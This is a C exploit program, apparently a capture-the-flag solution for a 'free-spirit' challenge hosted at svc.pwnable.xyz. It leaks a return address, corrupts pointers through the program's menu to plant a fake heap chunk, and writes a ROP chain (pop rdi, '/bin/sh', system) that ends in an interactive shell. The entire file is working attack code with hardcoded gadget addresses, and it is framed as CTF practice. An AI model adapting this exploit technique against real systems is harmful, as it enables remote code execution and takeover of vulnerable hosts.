#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <exdev.h>

#ifdef EXPLOIT_LOCAL
#define BINPATH "./free-spirit"
#else
#include <netinet/in.h>
#define HOST "svc.pwnable.xyz"
#define PORT 30005
#endif

uint64_t pop_rdi = 0x400ab3;
uint64_t jmp_system = 0x400778;
uint64_t rw_addr = 0x601100;
uint64_t ret = 0x400746;
uint64_t fake_chunk = 0x601038;

int main(int argc, char **argv, char **envp){
    char buf[255];
    memset(buf, 0, 255);
    uint64_t leak = 0;
    uint64_t addr_ret = 0;

#ifdef EXPLOIT_LOCAL
#define TARGET_STDIN p->stdin
#define TARGET_STDOUT p->stdout
#define TARGET_STDERR p->stderr
    PROC *p = NULL;
    char *args[] = {BINPATH, NULL};

    p = process(BINPATH, args, envp, 0);
    if(!p){
        fprintf(stderr, "%s:%d:process(): Failed to spawn process\n", __FILE__, __LINE__);
        return 1;
    }
    printf("PID: %d\n", p->pid);

#else
#define TARGET_STDIN r->sock
#define TARGET_STDOUT r->sock
#define TARGET_STDERR r->sock
    REMOTE *r = NULL;

    r = remote(HOST, PORT, AF_INET, SOCK_STREAM);
    if(!r){
        fprintf(stderr, "%s:%d:remote(): Failed to connect to %s:%hu", __FILE__, __LINE__, HOST, PORT);
        return 1;
    }
#endif
    read(TARGET_STDOUT, buf, 2);
    buf[0] = '2';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 2);

    read(TARGET_STDOUT, buf, 64);
    buf[strlen(buf)-3] = '\0';
    leak = strtoul(buf, NULL, 16);
    addr_ret = leak+88;

    memset(buf+2, 0, 46);
    buf[0] = '1';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);
    *(uint64_t *)(buf) = (uint64_t)-1;
    *(uint64_t *)(buf+8) = addr_ret;
    write(TARGET_STDIN, buf, 32);

    read(TARGET_STDOUT, buf, 2);
    memset(buf, 0, 16);
    buf[0] = '3';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);

    read(TARGET_STDOUT, buf, 2);
    buf[0] = '1';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);
    *(uint64_t *)(buf) = pop_rdi;
    *(uint64_t *)(buf+8) = rw_addr;
    *(uint64_t *)(buf+16) = ret;
    *(uint64_t *)(buf+24) = jmp_system;
    write(TARGET_STDIN, buf, 32);

    read(TARGET_STDOUT, buf, 2);
    memset(buf+2, 0, 30);
    buf[0] = '3';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);
    
    read(TARGET_STDOUT, buf, 2);
    buf[0] = '1';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);
    strncpy(buf, "/bin/sh", 8);
    *(uint64_t *)(buf+8) = fake_chunk;
    write(TARGET_STDIN, buf, 32);

    read(TARGET_STDOUT, buf, 2);
    memset(buf+2, 0, 46);
    buf[0] = '3';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);
    read(TARGET_STDOUT, buf, 2);
    buf[0] = '1';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);
    buf[0] = '\x51';
    memset(buf+1, 0, 7);
    *(uint64_t *)(buf+8) = fake_chunk+8;
    memset(buf+16, 0x41, 16);
    write(TARGET_STDIN, buf, 32);
    read(TARGET_STDOUT, buf, 2);
    memset(buf, 0, 48);
    buf[0] = '3';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);
    read(TARGET_STDOUT, buf, 2);
    buf[0] = '1';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);
    memset(buf, 0x41, 31);
    *(buf+31) = '\n';
    write(TARGET_STDIN, buf, 32);
    memset(buf, 0, 48);
    read(TARGET_STDOUT, buf, 2);
    buf[0] = '0';
    buf[1] = '\n';
    write(TARGET_STDIN, buf, 48);

    shell(TARGET_STDIN, TARGET_STDOUT, TARGET_STDERR);

#ifdef EXPLOIT_LOCAL
    reap_process(p);
#elif EXPLOIT_REMOTE
    remote_close(r);
#endif
    return 0;
}